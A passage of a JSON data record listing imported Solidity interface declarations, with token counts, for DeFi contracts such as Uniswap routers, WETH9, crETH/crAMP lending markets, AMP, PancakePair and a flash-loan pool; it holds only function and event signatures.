from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V3",
                        "content": "interface Uni_Router_V3 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    struct ExactOutputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to\n    ) external payable returns (uint256 amountOut);\n\n    function exactInputSingle(\n        ExactInputSingleParams memory params\n    ) external payable returns (uint256 amountOut);\n\n    function exactOutputSingle(\n        ExactOutputSingleParams calldata params\n        ) external payable returns (uint256 amountIn);\n\n}\n",
                        "token_count": 212,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    },
                    {
                        "name": "WETH9",
                        "content": "interface WETH9 {\n  function name() external view returns (string memory);\n\n  function approve(address guy, uint256 wad) external returns (bool);\n\n  function totalSupply() external view returns (uint256);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 wad\n  ) external returns (bool);\n\n  function withdraw(uint256 wad) external;\n\n  function decimals() external view returns (uint8);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function symbol() external view returns (string memory);\n\n  function transfer(address dst, uint256 wad) external returns (bool);\n\n  function deposit() external payable;\n\n  function allowance(address, address) external view returns (uint256);\n\n  event Approval(address indexed src, address indexed guy, uint256 wad);\n  event Transfer(address indexed src, address indexed dst, uint256 wad);\n  event Deposit(address indexed dst, uint256 wad);\n  event Withdrawal(address indexed src, uint256 wad);\n}\n",
                        "token_count": 210,
                        "imported": true
                    },
                    {
                        "name": "crETH",
                        "content": "interface crETH {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewComptroller(address oldComptroller, address newComptroller);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _setComptroller(address newComptroller) external returns (uint256);\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function comptroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function initialize(\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function interestRateModel() external view returns (address);\n\n  function isCToken() external view returns (bool);\n\n  function liquidateBorrow(address borrower, address cTokenCollateral)\n  external\n  payable;\n\n  function mint() external payable;\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow() external payable;\n\n  function repayBorrowBehalf(address borrower) external payable;\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n}\n",
                        "token_count": 1097,
                        "imported": true
                    },
                    {
                        "name": "crAMP",
                        "content": "interface crAMP {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewComptroller(address oldComptroller, address newComptroller);\n  event NewImplementation(address oldImplementation, address newImplementation);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _addReserves(uint256 addAmount) external returns (uint256);\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _setComptroller(address newComptroller) external returns (uint256);\n\n  function _setImplementation(\n    address implementation_,\n    bool allowResign,\n    bytes memory becomeImplementationData\n  ) external;\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function comptroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function delegateToImplementation(bytes memory data)\n  external\n  returns (bytes memory);\n\n  function delegateToViewImplementation(bytes memory data)\n  external\n  view\n  returns (bytes memory);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function interestRateModel() external view returns (address);\n\n  function isCToken() external view returns (bool);\n\n  function liquidateBorrow(\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral\n  ) external returns (uint256);\n\n  function mint(uint256 mintAmount) external returns (uint256);\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow(uint256 repayAmount) external returns (uint256);\n\n  function repayBorrowBehalf(address borrower, uint256 repayAmount)\n  external\n  returns (uint256);\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 1205,
                        "imported": true
                    },
                    {
                        "name": "AMP",
                        "content": "interface AMP {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event ApprovalByPartition(\n    bytes32 indexed partition,\n    address indexed owner,\n    address indexed spender,\n    uint256 value\n  );\n  event AuthorizedOperator(\n    address indexed operator,\n    address indexed tokenHolder\n  );\n  event AuthorizedOperatorByPartition(\n    bytes32 indexed partition,\n    address indexed operator,\n    address indexed tokenHolder\n  );\n  event ChangedPartition(\n    bytes32 indexed fromPartition,\n    bytes32 indexed toPartition,\n    uint256 value\n  );\n  event CollateralManagerRegistered(address collateralManager);\n  event Minted(\n    address indexed operator,\n    address indexed to,\n    uint256 value,\n    bytes data\n  );\n  event OwnerUpdate(address indexed oldValue, address indexed newValue);\n  event OwnershipTransferAuthorization(address indexed authorizedAddress);\n  event PartitionStrategySet(\n    bytes4 flag,\n    string name,\n    address indexed implementation\n  );\n  event RevokedOperator(address indexed operator, address indexed tokenHolder);\n  event RevokedOperatorByPartition(\n    bytes32 indexed partition,\n    address indexed operator,\n    address indexed tokenHolder\n  );\n  event Swap(address indexed operator, address indexed from, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  event TransferByPartition(\n    bytes32 indexed fromPartition,\n    address operator,\n    address indexed from,\n    address indexed to,\n    uint256 value,\n    bytes data,\n    bytes operatorData\n  );\n\n  function allowance(address _owner, address _spender)\n  external\n  view\n  returns (uint256);\n\n  function allowanceByPartition(\n    bytes32 _partition,\n    address _owner,\n    address _spender\n  ) external view returns (uint256);\n\n  function approve(address _spender, uint256 _value) external returns (bool);\n\n  function approveByPartition(\n    bytes32 _partition,\n    address _spender,\n    uint256 _value\n  ) external returns (bool);\n\n  function assumeOwnership() external;\n\n  function authorizeOperator(address _operator) external;\n\n  function authorizeOperatorByPartition(bytes32 _partition, address _operator)\n  external;\n\n  function authorizeOwnershipTransfer(address _authorizedAddress) external;\n\n  function authorizedNewOwner() external view returns (address);\n\n  function balanceOf(address _tokenHolder) external view returns (uint256);\n\n  function balanceOfByPartition(bytes32 _partition, address _tokenHolder)\n  external\n  view\n  returns (uint256);\n\n  function canImplementInterfaceForAddress(bytes32 _interfaceHash, address)\n  external\n  view\n  returns (bytes32);\n\n  function collateralManagers(uint256) external view returns (address);\n\n  function decimals() external pure returns (uint8);\n\n  function decreaseAllowance(address _spender, uint256 _subtractedValue)\n  external\n  returns (bool);\n\n  function decreaseAllowanceByPartition(\n    bytes32 _partition,\n    address _spender,\n    uint256 _subtractedValue\n  ) external returns (bool);\n\n  function defaultPartition() external view returns (bytes32);\n\n  function granularity() external pure returns (uint256);\n\n  function increaseAllowance(address _spender, uint256 _addedValue)\n  external\n  returns (bool);\n\n  function increaseAllowanceByPartition(\n    bytes32 _partition,\n    address _spender,\n    uint256 _addedValue\n  ) external returns (bool);\n\n  function isCollateralManager(address _collateralManager)\n  external\n  view\n  returns (bool);\n\n  function isOperator(address _operator, address _tokenHolder)\n  external\n  view\n  returns (bool);\n\n  function isOperatorForCollateralManager(\n    bytes32 _partition,\n    address _operator,\n    address _collateralManager\n  ) external view returns (bool);\n\n  function isOperatorForPartition(\n    bytes32 _partition,\n    address _operator,\n    address _tokenHolder\n  ) external view returns (bool);\n\n  function isPartitionStrategy(bytes4 _prefix) external view returns (bool);\n\n  function name() external view returns (string memory);\n\n  function owner() external view returns (address);\n\n  function partitionStrategies(uint256) external view returns (bytes4);\n\n  function partitionsOf(address _tokenHolder)\n  external\n  view\n  returns (bytes32[] memory);\n\n  function registerCollateralManager() external;\n\n  function revokeOperator(address _operator) external;\n\n  function revokeOperatorByPartition(bytes32 _partition, address _operator)\n  external;\n\n  function setPartitionStrategy(bytes4 _prefix, address _implementation)\n  external;\n\n  function swap(address _from) external;\n\n  function swapToken() external view returns (address);\n\n  function swapTokenGraveyard() external view returns (address);\n\n  function symbol() external view returns (string memory);\n\n  function totalPartitions() external view returns (bytes32[] memory);\n\n  function totalSupply() external view returns (uint256);\n\n  function totalSupplyByPartition(bytes32) external view returns (uint256);\n\n  function transfer(address _to, uint256 _value) external returns (bool);\n\n  function transferByPartition(\n    bytes32 _partition,\n    address _from,\n    address _to,\n    uint256 _value,\n    bytes memory _data,\n    bytes memory _operatorData\n  ) external returns (bytes32);\n\n  function transferFrom(\n    address _from,\n    address _to,\n    uint256 _value\n  ) external returns (bool);\n}\n",
                        "token_count": 1130,
                        "imported": true
                    },
                    {
                        "name": "IUSDC",
                        "content": "interface IUSDC {\n  function Swapin(\n    bytes32 txhash,\n    address account,\n    uint256 amount\n  ) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n}\n",
                        "token_count": 76,
                        "imported": true
                    },
                    {
                        "name": "IBaseV1Router01",
                        "content": "interface IBaseV1Router01 {\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    bool stable,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function swapExactTokensForTokensSimple(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address tokenFrom,\n    address tokenTo,\n    bool stable,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n}\n",
                        "token_count": 152,
                        "imported": true
                    },
                    {
                        "name": "IDeiLenderSolidex",
                        "content": "interface IDeiLenderSolidex {\n  function addCollateral(address to, uint256 amount) external;\n\n  function borrow(\n    address to,\n    uint256 amount,\n    uint256 price,\n    uint256 timestamp,\n    bytes memory reqId,\n    SchnorrSign[] memory sigs\n  ) external returns (uint256 debt);\n}\n",
                        "token_count": 71,
                        "imported": true
                    },
                    {
                        "name": "ISSPv4",
                        "content": "interface ISSPv4 {\n  function buyDei(uint256 amountIn) external;\n}\n",
                        "token_count": 19,
                        "imported": true
                    },
                    {
                        "name": "ILpDepositor",
                        "content": "interface ILpDepositor {\n  function deposit(address pool, uint256 amount) external;\n}\n",
                        "token_count": 20,
                        "imported": true
                    },
                    {
                        "name": "IOracle",
                        "content": "interface IOracle {\n  function getOnChainPrice() external view returns (uint256);\n}\n",
                        "token_count": 19,
                        "imported": true
                    },
                    {
                        "name": "DVM",
                        "content": "interface DVM {\n  function flashLoan(\n    uint256 baseAmount,\n    uint256 quoteAmount,\n    address assetTo,\n    bytes calldata data\n  ) external;\n\n  function init(\n    address maintainer,\n    address baseTokenAddress,\n    address quoteTokenAddress,\n    uint256 lpFeeRate,\n    address mtFeeRateModel,\n    uint256 i,\n    uint256 k,\n    bool isOpenTWAP\n  ) external;\n\n  function _BASE_TOKEN_() external returns(address);\n  function _QUOTE_TOKEN_() external returns(address);\n}\n",
                        "token_count": 114,
                        "imported": true
                    },
                    {
                        "name": "Surge",
                        "content": "interface Surge {\n  function sell(uint256 tokenAmount) external returns (bool);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n}\n",
                        "token_count": 46,
                        "imported": true
                    },
                    {
                        "name": "USDT",
                        "content": "interface USDT {\n  function transfer(address to, uint256 value) external;\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external;\n}\n",
                        "token_count": 43,
                        "imported": true
                    },
                    {
                        "name": "IMasterChef",
                        "content": "interface IMasterChef {\n  event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n  event EmergencyWithdraw(\n    address indexed user,\n    uint256 indexed pid,\n    uint256 amount\n  );\n  event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n  event WithdrawChange(\n    address indexed user,\n    address indexed token,\n    uint256 change\n  );\n\n  function BONUS_MULTIPLIER() external view returns (uint256);\n\n  function WETH() external view returns (address);\n\n  function _become(address proxy) external;\n\n  function _totalClaimed(address, uint256) external view returns (uint256);\n\n  function _whitelist(address) external view returns (address);\n\n  function add(\n    uint256 _allocPoint,\n    address _lpToken,\n    uint256 _pooltype,\n    address _ticket,\n    bool _withUpdate\n  ) external;\n\n  function admin() external view returns (address);\n\n  function bonusEndBlock() external view returns (uint256);\n\n  function check_vip_limit(\n    uint256 ticket_level,\n    uint256 ticket_count,\n    uint256 amount\n  ) external view returns (uint256 allowed, uint256 overflow);\n\n  function claimFeeRate() external view returns (uint256);\n\n  function deposit(uint256 _pid, uint256 _amount) external;\n\n  function depositByAddLiquidity(\n    uint256 _pid,\n    address[2] memory _tokens,\n    uint256[2] memory _amounts\n  ) external;\n\n  function depositByAddLiquidityETH(\n    uint256 _pid,\n    address _token,\n    uint256 _amount\n  ) external payable;\n\n  function depositSingle(\n    uint256 _pid,\n    address _token,\n    uint256 _amount,\n    address[][2] memory paths,\n    uint256 _minTokens\n  ) external payable;\n\n  function depositSingleTo(\n    address _user,\n    uint256 _pid,\n    address _token,\n    uint256 _amount,\n    address[][2] memory paths,\n    uint256 _minTokens\n  ) external payable;\n\n  function depositTo(\n    uint256 _pid,\n    uint256 _amount,\n    address _user\n  ) external;\n\n  function deposit_all_tickets(address ticket) external;\n\n  function dev(address _devaddr) external;\n\n  function devaddr() external view returns (address);\n\n  function emergencyWithdraw(uint256 _pid) external;\n\n  function farmPercent(uint256) external view returns (uint8);\n\n  function feeDistributor() external view returns (address);\n\n  function getMultiplier(uint256 _from, uint256 _to)\n  external\n  view\n  returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function initialize(\n    address _t42,\n    address _treasury,\n    address _feeDistributor,\n    address _devaddr,\n    uint256 _bonusEndBlock,\n    address _WETH,\n    address _paraRouter\n  ) external;\n\n  function massUpdatePools() external;\n\n  function migrate(uint256 _pid) external;\n\n  function migrator() external view returns (address);\n\n  function onERC721Received(\n    address,\n    address,\n    uint256,\n    bytes memory\n  ) external returns (bytes4);\n\n  function paraRouter() external view returns (address);\n\n  function pendingAdmin() external view returns (address);\n\n  function pendingImplementation() external view returns (address);\n\n  function pendingT42(uint256 _pid, address _user)\n  external\n  view\n  returns (uint256 pending, uint256 fee);\n\n  function poolInfo(uint256)\n  external\n  view\n  returns (\n    address lpToken,\n    uint256 allocPoint,\n    uint256 lastRewardBlock,\n    uint256 accT42PerShare,\n    address ticket,\n    uint256 pooltype\n  );\n\n  function poolLength() external view returns (uint256);\n\n  function poolsTotalDeposit(uint256) external view returns (uint256);\n\n  function set(\n    uint256 _pid,\n    uint256 _allocPoint,\n    bool _withUpdate\n  ) external;\n\n  function setClaimFeeRate(uint256 newRate) external;\n\n  function setFarmPercents(uint8[] memory percents) external;\n\n  function setFeeDistributor(address _newAddress) external;\n\n  function setMigrator(address _migrator) external;\n\n  function setRouter(address _router) external;\n\n  function setT42(address _t42) external;\n\n  function setTreasury(address _treasury) external;\n\n  function setWhitelist(address _whtie, address accpeter) external;\n\n  function setWithdrawFeeRate(uint256 newRate) external;\n\n  function startBlock() external view returns (uint256);\n\n  function t42() external view returns (address);\n\n  function t42PerBlock(uint8 index) external view returns (uint256);\n\n  function ticket_staked_array(address who, address ticket)\n  external\n  view\n  returns (uint256[] memory);\n\n  function ticket_staked_count(address who, address ticket)\n  external\n  view\n  returns (uint256);\n\n  function ticket_stakes(\n    address,\n    address,\n    uint256\n  ) external view returns (uint256);\n\n  function totalAllocPoint() external view returns (uint256);\n\n  function totalClaimed(\n    address _user,\n    uint256 pooltype,\n    uint256 index\n  ) external view returns (uint256);\n\n  function treasury() external view returns (address);\n\n  function updatePool(uint256 _pid) external;\n\n  function userChange(address, address) external view returns (uint256);\n\n  function userInfo(uint256, address)\n  external\n  view\n  returns (uint256 amount, uint256 rewardDebt);\n\n  function withdraw(uint256 _pid, uint256 _amount) external;\n\n  function withdrawAndRemoveLiquidity(\n    uint256 _pid,\n    uint256 _amount,\n    bool isBNB\n  ) external;\n\n  function withdrawChange(address[] memory tokens) external;\n\n  function withdrawFeeRate() external view returns (uint256);\n\n  function withdrawSingle(\n    address tokenOut,\n    uint256 _pid,\n    uint256 _amount,\n    address[][2] memory paths\n  ) external;\n\n  function withdraw_tickets(uint256 _pid, uint256 tokenId) external;\n}\n",
                        "token_count": 1315,
                        "imported": true
                    },
                    {
                        "name": "IPancakeCallee",
                        "content": "interface IPancakeCallee {\n  function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;\n}\n",
                        "token_count": 31,
                        "imported": true
                    },
                    {
                        "name": "IPancakePair",
                        "content": "interface IPancakePair {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external pure returns (string memory);\n\n  function symbol() external pure returns (string memory);\n\n  function decimals() external pure returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n  function nonces(address owner) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n\n  function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n  function factory() external view returns (address);\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 reserve0,\n    uint112 reserve1,\n    uint32 blockTimestampLast\n  );\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n  ) external;\n\n  function skim(address to) external;\n\n  function sync() external;\n\n  function initialize(address, address) external;\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "IPancakeRouter",
